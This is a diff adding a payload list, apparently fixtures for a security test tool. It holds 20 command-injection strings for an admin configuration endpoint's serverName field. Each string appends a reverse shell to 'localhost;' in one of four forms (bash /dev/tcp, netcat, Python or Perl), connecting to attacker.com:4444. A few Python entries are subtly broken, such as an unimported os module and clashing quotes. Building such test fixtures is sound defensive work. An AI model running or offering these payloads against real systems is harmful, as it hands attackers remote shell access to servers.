@@ -1,0 +1,30 @@
+# Reverse Shell Command Injection Payloads
+# Format: method|endpoint|payload|expected_code|attack_id|description
+
+# Bash Reverse Shells
+POST|/rest/admin/application-configuration|{"serverName":"localhost; bash -i >& /dev/tcp/attacker.com/4444 0>&1"}|500|shell_bash_001|Bash TCP reverse shell
+POST|/rest/admin/application-configuration|{"serverName":"localhost; bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'"}|500|shell_bash_002|Bash -c reverse shell
+POST|/rest/admin/application-configuration|{"serverName":"localhost; 0<&196;exec 196<>/dev/tcp/attacker.com/4444; sh <&196 >&196 2>&196"}|500|shell_bash_003|File descriptor shell
+POST|/rest/admin/application-configuration|{"serverName":"localhost; exec 5<>/dev/tcp/attacker.com/4444;cat <&5 | while read line; do $line 2>&5 >&5; done"}|500|shell_bash_004|Exec redirect shell
+POST|/rest/admin/application-configuration|{"serverName":"localhost; bash -i 5<> /dev/tcp/attacker.com/4444 0<&5 1>&5 2>&5"}|500|shell_bash_005|Alternative bash shell
+
+# Netcat Reverse Shells
+POST|/rest/admin/application-configuration|{"serverName":"localhost; nc -e /bin/sh attacker.com 4444"}|500|shell_nc_001|Netcat -e shell
+POST|/rest/admin/application-configuration|{"serverName":"localhost; nc -e /bin/bash attacker.com 4444"}|500|shell_nc_002|Netcat bash shell
+POST|/rest/admin/application-configuration|{"serverName":"localhost; nc -c /bin/sh attacker.com 4444"}|500|shell_nc_003|Netcat -c shell
+POST|/rest/admin/application-configuration|{"serverName":"localhost; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f"}|500|shell_nc_004|Netcat mkfifo shell
+POST|/rest/admin/application-configuration|{"serverName":"localhost; nc attacker.com 4444 | /bin/sh | nc attacker.com 4445"}|500|shell_nc_005|Netcat dual port
+
+# Python Reverse Shells
+POST|/rest/admin/application-configuration|{"serverName":"localhost; python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'"}|500|shell_python_001|Python2 reverse shell
+POST|/rest/admin/application-configuration|{"serverName":"localhost; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'"}|500|shell_python_002|Python3 reverse shell
+POST|/rest/admin/application-configuration|{"serverName":"localhost; python -c 'import pty;import socket;s=socket.socket();s.connect((\"attacker.com\",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'"}|500|shell_python_003|Python PTY shell
+POST|/rest/admin/application-configuration|{"serverName":"localhost; python -c 'exec(\"import socket,subprocess;s=socket.socket();s.connect(('attacker.com',4444));subprocess.call(['/bin/sh'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\")'"}|500|shell_python_004|Python exec shell
+POST|/rest/admin/application-configuration|{"serverName":"localhost; python -c '__import__(\"os\").system(\"bash -i >& /dev/tcp/attacker.com/4444 0>&1\")'"}|500|shell_python_005|Python import shell
+
+# Perl Reverse Shells
+POST|/rest/admin/application-configuration|{"serverName":"localhost; perl -e 'use Socket;$i=\"attacker.com\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"}|500|shell_perl_001|Perl socket shell
+POST|/rest/admin/application-configuration|{"serverName":"localhost; perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"attacker.com:4444\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"}|500|shell_perl_002|Perl IO shell
+POST|/rest/admin/application-configuration|{"serverName":"localhost; perl -MIO::Socket -e 'exit if fork;$c=new IO::Socket::INET(\"attacker.com:4444\");$c->autoflush(1);STDIN->fdopen($c,\"r\");STDOUT->fdopen($c,\"w\");STDERR->fdopen($c,\"w\");exec(\"/bin/sh -i\")'"}|500|shell_perl_003|Perl autoflush shell
+POST|/rest/admin/application-configuration|{"serverName":"localhost; perl -e 'exec \"/bin/sh -i\" if fork;socket(S,2,1,6);connect(S,pack(\"SnA*x8\",2,4444,\"attacker.com\"));open(STDIN,\"<&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");'"}|500|shell_perl_004|Perl fork shell
+POST|/rest/admin/application-configuration|{"serverName":"localhost; perl -e 'use IO::Socket::INET;$s=IO::Socket::INET->new(\"attacker.com:4444\");open(STDIN,\"<&\",$s);open(STDOUT,\">&\",$s);open(STDERR,\">&\",$s);exec(\"/bin/sh -i\")'"}|500|shell_perl_005|Perl INET shell
